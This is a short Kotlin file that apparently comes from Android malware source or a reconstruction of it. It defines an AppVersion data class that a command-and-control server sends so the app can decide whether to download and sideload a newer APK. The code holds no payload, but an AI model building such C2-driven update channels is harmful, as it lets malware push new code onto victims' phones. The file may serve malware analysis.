package xyz.happify.ckemv

/**
 * Sent down by the C2 inside [MeResponse]. The app compares against its own
 * hard-coded internal version (1.7, see [ConfigRefreshLoop]) to decide whether
 * to download and sideload a newer APK.
 */
data class AppVersion(
    val major: Int,
    val minor: Int,
    val hash: String,
)
